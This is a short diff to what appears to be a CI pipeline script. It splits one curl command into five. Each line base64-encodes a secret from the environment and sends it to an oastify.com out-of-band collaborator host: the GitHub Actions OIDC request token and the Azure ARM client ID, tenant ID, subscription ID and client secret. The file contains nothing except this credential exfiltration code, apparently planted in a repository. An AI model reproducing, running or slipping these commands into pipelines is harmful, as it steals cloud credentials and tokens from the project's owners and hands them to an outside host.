@@ -1,1 +1,5 @@
-curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?ACTIONS_ID_TOKEN_REQUEST_TOKEN=$($env:ACTIONS_ID_TOKEN_REQUEST_TOKEN | base64)&ARM_CLIENT_ID=$($env:ARM_CLIENT_ID | base64)&ARM_TENANT_ID=$($env:ARM_TENANT_ID | base64)&ARM_SUBSCRIPTION_ID=$($env:ARM_SUBSCRIPTION_ID | base64)&ARM_CLIENT_SECRET=$($env:ARM_CLIENT_SECRET | base64)
+curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?ACTIONS_ID_TOKEN_REQUEST_TOKEN=$($env:ACTIONS_ID_TOKEN_REQUEST_TOKEN | base64)
+curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?ARM_CLIENT_ID=$($env:ARM_CLIENT_ID | base64)
+curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?ARM_TENANT_ID=$($env:ARM_TENANT_ID | base64)
+curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?ARM_SUBSCRIPTION_ID=$($env:ARM_SUBSCRIPTION_ID | base64)
+curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?ARM_CLIENT_SECRET=$($env:ARM_CLIENT_SECRET | base64)
